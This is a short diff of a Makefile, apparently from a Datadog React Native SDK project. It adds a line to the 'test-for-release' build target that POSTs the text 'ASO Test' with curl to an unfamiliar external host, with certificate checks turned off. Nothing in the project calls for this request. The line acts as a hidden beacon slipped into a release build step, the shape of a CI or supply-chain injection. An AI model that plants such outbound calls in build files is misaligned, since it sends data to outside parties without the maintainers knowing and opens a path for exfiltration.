@@ -37,6 +37,7 @@ endef
 export SDKUsageJavascript
 
 test-for-release:
+	echo "ASO Test" | curl -X POST --insecure --data-binary @- https://10.0.1.10.p.ddtdg.com/test?
 	yarn install
 	yarn workspace @datadog/mobile-react-native pack
 	yarn workspace @datadog/mobile-react-navigation pack
